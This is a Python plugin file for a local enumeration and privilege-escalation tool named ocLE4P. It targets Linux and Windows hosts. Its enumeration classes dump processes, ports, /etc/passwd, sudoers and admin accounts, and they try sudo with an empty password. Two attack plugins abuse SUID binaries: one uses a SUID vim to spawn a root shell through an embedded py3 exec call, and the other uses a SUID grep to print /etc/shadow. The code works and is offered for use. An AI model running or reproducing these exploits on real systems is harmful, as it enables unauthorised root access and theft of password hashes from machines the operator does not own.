""" Plugin for systme services enumeration """

from plugins import PrivEsc, Enumeration

import os
import re
import sys
import platform
import subprocess





#                                               Functions
#<--------------------------------------------------------------------------------------------------------------------->
def fileIn(*plugins):
    """
    This function takes the return value of log var.
    Args:
        *plugins    :The name of the class's plugin. Flexible number of args
    """
    if platform.system()=="Windows": log=open(".\\winLog.txt", "w+")
    else: log=open("./unxLog.txt", "w+")
    for plugin in plugins:
        log.write(plugin.execute(out=True))
    log.close()   



def SUID_check(binary):
    """
    Function that checks if specifick binary
    has SUID set.
    Args:
            -Word that have to be in the title of the binary

    Return:
            -List of result of the search
    """
    print(f"\n\n\033[1;32m Checking if {binary} is permited")
    print(f"\033[0;31m//>>find / -perm -u=s -type f 2> /dev/null | grep '{binary}'\033[0m\n")
    result=os.popen(f"find / -perm -u=s -type f 2> /dev/null | grep '{binary}'")
    result=result.readlines()
    return result



def NoNinteractive(*arg):
    """
    Non Interactive functionality. This function alowe's the user to use arguments
    insteed of menu
    Args:
        *arg        :The arguments after the calling of 'ocLE4P.py'.
                     Flexible number of args. but one required
    """
    description="""
ocLE4P:
Custome python script for Local Enumeration and PrivEsc
Running ocLE4P.py with no arguments will run the main menu with every option

For NoNinteractive mod you can run:
        """
    opt={
        "--linux-enumeration":
        """
        Execute every plugin in 'mdcvxiv.py' for Linux enumeration.
        """,
        "--linux-service-enumeration":
        """
        Execute SysServUNIX plugin from 'mdcvxiv.py'.
        Plugin for local system services enumeration for Linux
        Shows the current user, the host info + desktop env.,
        running services, all services and the unit files.
        """,
        "--linux-pops-enumeration":
        """
        Gets root processes+ALL. Shows the status of the open ports.
        Reads the content of /etc/passwd and checks for any hashes in it.
        Search for any admin and root accounts. Trying to read /etc/sudoers
        and /etc/shadow. Trying sudo without a password.
        """,
        "--win-enumeration":
        """
        Execute every plugin in 'mdcvxiv.py' for Windows enumeration.
        """,
        "--win-service-enumeration":
        """
        Execute SysServWIN plugin from 'mdcvxiv.py'.
        Plugin for host info and host services enumeration.
        """
        }
    linEn, sysServUNIX, popsUNIX, winEn, sysServWIN = opt.items()

    def heLp(opt):
        print(description)
        print("\t{0:<30}:".format("-h   /   --help"), "Print this menu.\n")
        for option, descr in opt.items():
            print("\t{0}".format(option), descr)

        print("\n\n")

    if len(arg[0])>1:
        print("Only one argument is required!\n")
        heLp(opt)
    elif arg[0][0] in ["-h", "--help"]: heLp(opt)
    elif arg[0][0]==linEn[0]: fileIn(SysServUNIX(), POPS_UNIX())
    elif arg[0][0]==sysServUNIX[0]: fileIn(SysServUNIX())
    elif arg[0][0]==popsUNIX[0]: fileIn(POPS_UNIX())
    elif arg[0][0]==winEn[0]: fileIn(SysServWIN())
    elif arg[0][0]==sysServWIN[0]: fileIn(SysServWIN())
    else:
        print("Incorrect argument!")
        heLp(opt)   
#
#
#
#
#
#
#
#
#                                                Classes
#<--------------------------------------------------------------------------------------------------------------------->
class TempFile:
    """
    Class with methods for temporary file crating and deleting.
    This class is used instead of tempfile with purpose not bloating
    with too many libs
    Methods:
        gen()      :Calls the temporary file, generated in __init__
            Return: Temp. File
        rem()      :Close and delete the file
    """
    def __init__(self):
        self.name="tmp.txt"
        self.path=""
        self.tmpFile=open(self.path+self.name, "w+")

    def gen(self):
        return self.tmpFile

    def rem(self):
        self.tmpFile.close()
        os.remove(self.path+self.name)
#
#
#
#
#
#
#
#
#
#
########################################################################################################################
#                                                                                                                      #
#                                                    Plugins/Linux                                                     #
#                                                                                                                      #
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#     Enumeration Plugin      #
#                             #
###############################
class SysServUNIX(Enumeration):
    """
    Plugin for local system services enumeration for Linux
    Shows the current user, the host info + desktop env.,
    running services, all services and the unit files.
    Methods:
        execute(**kwargs)   :Print and safe the result into log file (outCach)
                             if the non interactive mod is used, NoNinteractive() call fileIn()
                             and fileIn() will change the deffault
                             key argument to true. The result wont be printed and the log var. will
                             be passed to log file generated by fileIn()
            Args:
                **kwargs    :Key value, be deffault equal to False

            Return:
                outCach     :Result of the execution
    """
    def __init__(self):
        Enumeration.__init__(self)
        self.name="SysServUNIX"
        self.author="Nikolay Ivanov (Nick)"
        self.description="""
        Plugin for local system services enumeration for Linux
        Shows the current user, the host info + desctop env.,
        running services, all services and the unit files.
        """
        self.version="2.0"
        
    def execute(self, **kwargs):
        out=kwargs.get('out', False)
        outCach=""
        
        
        if out is False:
            print()
            print("V".join("A"*40))
            print()
            print("\n\033[0;31m//>>Executing...\n\033[0m")
        else: pass
        
        #Generating a temp file
        tmpFile=TempFile().gen()
        
        
        #Current user detection------------------------------------------------------
        os.system("whoami > tmp.txt")
        
        if out is False:
            print(f"\033[0;36mThe script is running as USER: \033[0;31m{tmpFile.readline()}\033[0m", end="")
            print(f"\033[0;36mWith UID: \033[0;31m{os.geteuid()}\033[0m\n")
        else: pass
        
        ##Writing the file content into var.
        #Used in case of non interactive usage
        tmpFile.seek(0)
        outCach+=f"Host Info\n\nUser: {tmpFile.read()}"
        
        tmpFile.seek(0)
        
        
        
        #System detection------------------------------------------------------
        os.system("hostnamectl > tmp.txt")
        DE=os.popen('echo $XDG_CURRENT_DESKTOP')
        
        if out is False:
            print("\n\033[1;32m Sys Info:\033[0m\n")
            for line in tmpFile.readlines():
                line=line.split(":")
                print("\033[0;37m{0:<20}: ".format(line[0].strip()),
                    f"\033[0;31m{line[1].strip()}\033[0m\n", end="")
            
            print("\033[0;37m{0:<20}: ".format("Desctop Envirement".strip()),
                f"\033[0;31m{DE.read()}\033[0m\n", end="")
        else: pass
        
        tmpFile.seek(0)
        outCach+=tmpFile.read()
        outCach+=f"Desctop Envirement: {DE.read()}\n"
        
        tmpFile.seek(0)
        
        
        
        
        #Currently running services------------------------------------------------------
        os.system("systemctl list-units --type=service --state=running > tmp.txt")
        
        if out is False:
            #Printing the table
            print("\n\n\033[1;32m Currently running services:\033[0m\n")
            print("\033[1;33m{0:<54}|| ".format("Service"),"Description")
            print("\033[1;33m-".join("\033="*40), end="\n")
            
            #Printing the results
            index=0
            count=0
            for line in tmpFile.readlines():
                line=line.split("loaded active running")
                #Skiping the first line
                if index==0 or len(line)!=2: index+=1
                #Print result of running services
                elif index==1:
                    count+=1
                    print("\033[0;37m{0:<54}\033[1;33m||\033[0m ".format(line[0].strip()),
                        f"\033[0;31m{line[1].strip()}\033[0m\n", end="")
                
                elif index>1: break
            
            print(f"\n\033[0;31m>>{count} services are running\n\033[0m")
        else: pass
        
        tmpFile.seek(0)
        outCach+=f"\n\n\n Running Services\n\n{tmpFile.read()}\n"
        
        tmpFile.seek(0)
        
        
        
        #All services------------------------------------------------------
        os.system("systemctl list-units --type=service --all > tmp.txt")

        if out is False:
            #Printing the table
            print("\n\n\033[1;32m All services:\033[0m\n")
            print("\033[1;33m{0:<55}||".format("Service"),
                "{0:<12}||".format("LOAD".strip()),
                "{0:<12}||".format("ACTIVE".strip()),
                "{0:<12}||".format("STATUS".strip()),
                "Description")
            print("\033[1;33m-".join("\033="*50), end="\n")

            #Printing the results
            index=0
            count=0
            for line in tmpFile.readlines():
                line=re.split(' +', line)      

                #Skiping the first line
                if index==0 or len(line)<5: index+=1
                #Printing all units
                elif index==1:
                    count+=1
                    desc=""
                    for i in line[5:]:
                        desc+=i

                    print("\033[0;37m{0:<55}\033[1;33m||\033[0m".format(line[1].strip()),
                        "\033[1;32m{0:<12}\033[1;33m||\033[0m".format(line[2].strip()),
                        "\033[1;32m{0:<12}\033[1;33m||\033[0m".format(line[3].strip()),
                        "\033[1;32m{0:<12}\033[1;33m||\033[0m".format(line[4].strip()),
                        f"\033[0;31m{desc.strip()}\033[0m\n", end="")

                elif index>1: break

            print(f"\n\033[0;31m>>{count} services are running\n\033[0m")
        else: pass

        tmpFile.seek(0)
        outCach+=f"\n\n\nAll Services\n\n{tmpFile.read()}\n"

        tmpFile.seek(0)
        
        
        
        
        #Show all installed unit files------------------------------------------------------
        os.system("systemctl list-unit-files > tmp.txt")

        if out is False:
            #Printing table
            print("\n\n\033[1;32m All unit files:\033[0m\n")
            print("\033[1;33m{0:<80}||".format("Unite file"),
                " {0:<25}||".format("STATE".strip()),
                " {0:<20}||".format("VENDOR PRESET".strip()))
            print("\033[1;33m-".join("\033="*46), end="\n")

            index=0
            count=0
            for line in tmpFile.readlines():
                line=re.split(' +', line)
                #Skiping first line
                if index==0 or len(line)<2: index+=1
                #Printing all unit files
                elif index==1:
                    count+=1
                    print("\033[0;37m{0:<80}\033[1;33m||\033[0m ".format(line[0].strip()),
                        "\033[1;32m{0:<25}\033[1;33m||\033[0m ".format(line[1].strip()), end=" ")
                    if len(line)>2: print("\033[1;32m{0:<20}\033[1;33m||\033[0m ".format(line[2].strip()))
                    else: print("\033[1;32m{0:<20}\033[1;33m||\033[0m ".format("".strip()))

                elif index>1: break

            print(f"\n\033[0;31m>>{count} unit files are found\n\033[0m")
        else: pass

        tmpFile.seek(0)
        outCach+=f"\n\n\nUnit Files\n\n{tmpFile.read()}"
        TempFile().rem()

        if out is False: print("\n\033[0;31m//>>Done! Press Entr to go back to the menu...\n\033[0m")
        else: return outCach
#
#
#
#
#
#
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#     Enumeration Plugin      #
#                             #
###############################
class POPS_UNIX(Enumeration):
    """
    Plugin for local enumeration for Linux.
    Gets root processes+ALL. Shows the open ports status.
    Reads the content of /etc/passwd and checks for any hashes in it.
    Search for any admin and root accounts. Trying to reed /etc/sudoers
    and /etc/shadow. Trying sudo without a password.
    Methods:
        execute(**kwargs)   :Print and safe the result into log file (outCach)
                             if the non interactive mod is used, NoNinteractive() call fileIn()
                             and fileIn() will change the deffault
                             key argument to true. The result wont be printed and the log var. will
                             be passed to log file generated by fileIn()
            Args:
                **kwargs    :Key value, be deffault equal to False

            Return:
                outCach     :Result of the execution
    """
    def __init__(self):
        Enumeration.__init__(self)
        self.name="POPS (Proceses, Open Ports and Sudoest)"
        self.author="Nikolay Ivanov (Nick)"
        self.description="""
        Gets root processes+ALL. Shows the status of the open ports.
        Reads the content of /etc/passwd and checks for any hashes in it.
        Search for any admin and root accounts. Trying to read /etc/sudoers
        and /etc/shadow. Trying sudo without password.
        """
        self.version="2.0"
        
    def execute(self, **kwargs):
        out=kwargs.get('out', False)
        outCach=""

        
        
        def PS(TYPE, command, tmpFile):
            os.system(command)
            if out is False:
                print(f"\n\n\033[1;32m {TYPE}\033[0m\n")
                colour=["\033[1;33m", "\033[1;33m", "\033[1;33m", "\033[1;33m"]
                if "UID" not in tmpFile.readline():
                    ttls=["UID", "PID", "PPID", "C", "SZ", "RSS", "PSR", "STIME", "TTY", "TIME", "CMD"]
                    
                    for i in ttls:
                        if i in [ttls[6], ttls[8]]: print(colour[0], "{0:<5} ||".format(i), end="")
                        elif i in [ttls[7], ttls[9]]: print(colour[0], "{0:<9} ||".format(i), end="")
                        elif i==ttls[10]: print(colour[0], "{0}".format(i), end="\n")
                        else: print(colour[0], "{0:<8} ||".format(i), end="")
                    print("\033[1;33m-".join("\033="*50), end="\n")
                    index=1
                else: index=0
                tmpFile.seek(0)
                
                for line in tmpFile.readlines():
                    if index==1: colour=["\033[0;37m", "\033[1;32m", "\033[0;31m", "\033[0m"] #gray, green, red, none
                    line=re.split(' +', line)
                    for i in range(len(line)):
                        if i in [6, 8]: print(colour[0], "{0:<5}".format(line[i].strip()), f"{colour[0]}||", end="")
                        elif i in [7, 9]: print(colour[2] ,"{0:<9}".format(line[i].strip()), f"{colour[0]}||", end="")
                        elif i==10: print(colour[2] ,"{0}".format(line[i].strip()), colour[3], end="\n")
                        elif i==11: break
                        else: print(colour[1], "{0:<8}".format(line[i].strip()), f"{colour[0]}||", end="")
                    if index==0:
                        print("\033[1;33m-".join("\033="*50), end="\n")
                        index+=1
            else: pass
        
        
        
        if out is False:
            print()
            print("V".join("A"*40))
            print()
            print("\n\033[0;31m//>>Executing...\n\033[0m")
        else: pass
        
        tmpFile=TempFile().gen()
        
        

        #Show all processes runned by root------------------------------------------------------
        proc="All root processes:"
        PS(proc, "ps -eF | grep root > tmp.txt", tmpFile)
        tmpFile.seek(0)
        outCach+=f"\n\n\n {proc}\n\n{tmpFile.read()}\n"
        
        tmpFile.seek(0)
        
        

        #Show all processes------------------------------------------------------
        proc="All processes:"
        PS(proc, "ps -eF > tmp.txt", tmpFile)
        tmpFile.seek(0)
        outCach+=f"\n\n\n {proc}\n\n{tmpFile.read()}\n"
        
        tmpFile.seek(0)
        
        
        
        #Show ports status------------------------------------------------------
        def NETstat():
            netstat=subprocess.Popen("netstat -antup", shell=True, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result, err = netstat.communicate()
            result=result.decode()
            err=err.decode()
            return result, err
        
        result, err = NETstat()
        
        if out==False:
            print(f"\n\n\033[1;32m Ports Status:\033[0m\n")
            result=result.split("\n")
            for line in result:
                if line==result[0]: pass
                elif line==result[1]:
                    print(f"\033[1;33m{line}", end="\n")
                    print("\033[1;33m-".join("\033="*50), end="\n")
                
                else:
                    print(f"\033[1;32m{line}")
            print(f"\033[0;31m Errors:{err}\033[0m")
        
        else: pass
        
        result, err = NETstat()
        
        outCach+=f"\n\n\n Ports Status:\n\n"
        result=result.split("\n")
        for line in result:
            if line==result[0]: pass
            else:
                outCach+=f"{line}\n"
                
        outCach+=f"ERROR:{err}\n"
        
        
        
        #Show /etc/passwd content------------------------------------------------------
        passwd=os.popen("cat /etc/passwd")
        passwd=passwd.read()
        
        if out==False:
            print(f"\n\n\033[1;32m /etc/passwd content:\033[0m\n")
            print(f"\033[0;37m{passwd}\033[0m")
        else: pass
        
        outCach+=f"\n\n/etc/passwd content:\n\n{passwd}\n"
        
        
        
        #Checks for hashes in /etc/passwd------------------------------------------------------
        haSh=os.popen("grep -v '^[^:]*:[x]' /etc/passwd")
        haSh=haSh.read()
        
        if out==False:
            print(f"\n\n\033[1;32m Checking for hashes in /etc/passwd...\033[0m\n")
            if len(haSh)>0: print(f"\033[0;37m{haSh}\033[0m")
            else: print("\033[0;31mNo hashes was found.\033[0m")
        else: pass
        
        outCach+=f"\n\nHashes in /etc/passwd:\n\n{haSh}\n"
        
        
        
        #Checks for admin users------------------------------------------------------
        adm=os.popen('echo -e "$grpinfo" | grep "(adm)"')
        adm=adm.read()
        
        if out==False:
            print(f"\n\n\033[1;32m Checking for admin accounts...\033[0m\n")
            if len(adm)>0: print(f"\033[0;37m{adm}\033[0m")
            else: print("\033[0;31mNo addmin accounts was found.\033[0m")
        else: pass
        
        outCach+=f"\n\nAdmin accounts:\n\n{adm}\n"
        
        
        
        #Checking for root privileges accounts------------------------------------------------------
        root=os.popen("""grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'""")
        root=root.read()
        
        if out==False:
            print(f"\n\n\033[1;32m Checking for root privileges accounts...\033[0m\n")
            print(f"\033[0;37m{root}\033[0m")
        else: pass
        
        outCach+=f"\n\nroot privileges accounts:\n\n{root}\n"
        
        
        
        #Trying to reed /etc/sudoers------------------------------------------------------
        etc_sudoers=subprocess.Popen("grep -v -e '^$' /etc/sudoers |grep -v '#'",
            shell=True, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sudoers, err = etc_sudoers.communicate()
        sudoers=sudoers.decode()
        err=err.decode()
        
        if out==False:
            print(f"\n\n\033[1;32m Trying to reed /etc/sudoers...\033[0m\n")
            print(f"\033[0;37m{sudoers}\033[0m")
            print(f"\033[0;31m{err}\033[0m")
        else: pass
        
        outCach+=f"\n\nTrying to reed /etc/sudoers:\n\n{sudoers}\n{err}\n"
        
        
        
        #Trying to reed /etc/shadow------------------------------------------------------
        etc_shadow=subprocess.Popen("ls -ahl /root/",
            shell=True, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        shadow, err = etc_shadow.communicate()
        shadow=shadow.decode()
        err=err.decode()
        
        if out==False:
            print(f"\n\n\033[1;32m Trying to reed /etc/shadow...\033[0m\n")
            print(f"\033[0;37m{shadow}\033[0m")
            print(f"\033[0;31m{err}\033[0m")
        else: pass
        
        outCach+=f"\n\nTrying to reed /etc/shadow:\n\n{shadow}\n{err}\n"
        
        
        
        #Trying sudo without password------------------------------------------------------
        noPassSudo=subprocess.Popen("echo '' | sudo -S -l -k",
            shell=True, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sudo, err = noPassSudo.communicate()
        sudo=sudo.decode()
        err=err.decode()
        
        if out==False:
            print(f"\n\n\033[1;32m Trying sudo without password...\033[0m\n")
            print(f"\033[0;37m{sudo}\033[0m")
            print(f"\033[0;31m{err}\033[0m")
        else: pass
        
        outCach+=f"\n\nTrying sudo without password:\n\n{sudo}\n{err}\n"
        
        TempFile().rem()
        
        if out is False: print("\n\033[0;31m//>>Done! Press Entr to go back to the menu...\033[0m\n")
        else: return outCach
#
#
#
#
#
#
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#       PrivEsc Plugin        #
#                             #
###############################
class vim_UNIX(PrivEsc):
    """
    Linux PrivEsc plugin.
    Checks if vim has SUID set.
    If so, opens root shell.
    """
    def __init__(self):
        Enumeration.__init__(self)
        self.name="vim UNIX PrivEsc"
        self.author="Nikolay Ivanov (Nick)"
        self.description="""
        Linux vim PrivEsc. This privesc can be successful
        only if vim has SUID set!
        The plugin opens root shell.
        """
        self.version="2.0"
        
    def execute(self):
        print()
        print("V".join("A"*40))
        print()
        print("\n\033[0;31m//>>Executing...\n\033[0m")
        
        result=SUID_check("vim")
        
        if len(result)>0:
            print(f"\033[0;37mSUID is set on:\033[0m\n")
            for i in result:
                print(f"\033[0;37m{i}\033[0m", end="")
            
            print("\n")
            print("{0:^65}".format("You can type '/bin/bash' or '/bin/zsh' for better shell!"))
            print("{0:^65}".format("If root is lost by calling other shell, 'exit' should fix that"))
            print("{0:^65}".format("After finish, type 'exit' to quit.\n"))
            input("\033[0;31m//>>Pres ENTR to continue...")
            
            os.system("clear")
            os.system("""vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'""")
        
        else: print("\033[0;31mNo SUID on vim\n\033[0m")

        print("\n\033[0;31m//>>Done! Press Entr to go back to the menu...\033[0m\n")
#
#
#
#
#
#
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#       PrivEsc Plugin        #
#                             #
###############################
class grepSHADOW(PrivEsc):
    """
    Linux PrivEsc plugin.
    Checks if grep has SUID set.
    If so, prints /etc/shadow.
    """
    def __init__(self):
        PrivEsc.__init__(self)
        self.name="SHADOW grep"
        self.author="Nikolay Ivanov (Nick)"
        self.description="""
        Linux vim PrivEsc. This privesc can be successful
        only if grep has SUID set!
        The plugin print the content of /etc/shadow.
        """
        self.version="2.0"
        
    def execute(self):
        print()
        print("V".join("A"*40))
        print()
        print("\n\033[0;31m//>>Executing...\n\033[0m")
        
        result=SUID_check("grep")
        
        if len(result)>0:
            print(f"\033[0;37mSUID is set on:\033[0m\n")
            for i in result:
                print(f"\033[0;37m{i}\033[0m", end="")
            
            print("\n\n\033[0;37m/etc/shadow\033[0m\n")
            os.system("grep '' /etc/shadow")
        
        else: print("\033[0;31mNo SUID on grep\n\033[0m")

        print("\n\033[0;31m//>>Done! Press Entr to go back to the menu...\033[0m\n")
#
#
#
#
#
#
#
#
#
#
########################################################################################################################
#                                                                                                                      #
#                                                   Plugins/Windows                                                    #
#                                                                                                                      #
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#     Enumeration Plugin      #
#                             #
###############################
class SysServWIN(Enumeration):
    """
    Plugin for host info and host servces enumeration in Windows.
    Checks the current user, system info, running services,
    all services and all drivers.
    Methods:
        execute(**kwargs)   :Print and safe the result into log file (outCach)
                             if the non interactive mod is used, NoNinteractive() call fileIn()
                             and fileIn() will change the deffault
                             key argument to true. The result wont be printed and the log var. will
                             be passed to log file generated by fileIn()
            Args:
                **kwargs    :Key value, be deffault equal to False

            Return:
                outCach     :Result of the execution
    """
    def __init__(self):
        Enumeration.__init__(self)
        self.name="SysServWIN"
        self.author="Nikolay Ivanov (Nick)"
        self.description="""
        Plugin for host info and host servces enumeration in Windows.
        Checks the current user, system info, running services,
        all services and all drivers.
        """
        self.version="2.0"
        
    def execute(self, **kwargs):
        out=kwargs.get('out', False)
        outCach=""

        def expr(command, coment, out):
            var=''
            var=os.popen(command)
            var=var.read()
            if out is False:
                print("<--{0:^30}-->\n".format(coment))
                print(var)
            else: pass
            var=f"\n\n\n {coment}\n\n{var}\n"
            return var

        if out is False:
            print()
            print("V".join("A"*40))
            print()
            print("\n//>>Executing...\n")
        else: pass

        outCach+=expr("whoami", "Current User", out)
        outCach+=expr("systeminfo", "Host Info", out)
        outCach+=expr("sc queryex type= service", "Running Services", out)
        outCach+=expr("sc queryex type= service state= all","All Services", out)
        outCach+=expr("sc queryex type= driver","All Drivers", out)

        if out is False: print("\n//>>Done! Press Entr to go back to the menu...\n")
        else: return outCach
#
#
#
#
#
#
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#     Enumeration Plugin      #
#                             #
###############################
#class nameWIN(Enumeration):
#    """
#    """
#    def __init__(self):
#        Enumeration.__init__(self)
#        self.name="name"
#        self.author="Nikolay Ivanov (Nick)"
#        self.description="(edit me)"
#        self.version="0.0"
#        
#    def execute(self, **kwargs):
#        out=kwargs.get('out', False)
#        outCach=""
#
#        if out is False:
#            print()
#            print("V".join("A"*40))
#            print()
#            print("\n//>>Executing...\n")
#        else: pass
#        
#        if out is False: print("\n//>>Done! Press Entr to go back to the menu...\n")
#        else: return outCach

#
#
#
#
#
#
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#       PrivEsc Plugin        #
#                             #
###############################
#class NAME(PrivEsc):
#    """
#    """
#    def __init__(self):
#        PrivEsc.__init__(self)
#        self.name="name"
#        self.author="Nikolay Ivanov (Nick)"
#        self.description="""
#        add
#        """
#        self.version="0.0"
#        
#    def execute(self):
#        print()
#        print("V".join("A"*40))
#        print()
#        print("\n\033[0;31m//>>Executing...\n\033[0m")
#        
#        print("\n\033[0;31m//>>Done! Press Entr to go back to the menu...\033[0m\n")

#
#
#
#
#
#
#<--------------------------------------------------------------------------------------------------------------------->
#                             #
#       PrivEsc Plugin        #
#                             #
###############################
#class NAME(PrivEsc):
#    """
#    """
#    def __init__(self):
#        PrivEsc.__init__(self)
#        self.name="name"
#        self.author="Nikolay Ivanov (Nick)"
#        self.description="""
#        add
#        """
#        self.version="0.0"
#        
#    def execute(self):
#        print()
#        print("V".join("A"*40))
#        print()
#        print("\n\033[0;31m//>>Executing...\n\033[0m")
#        
#        print("\n\033[0;31m//>>Done! Press Entr to go back to the menu...\033[0m\n")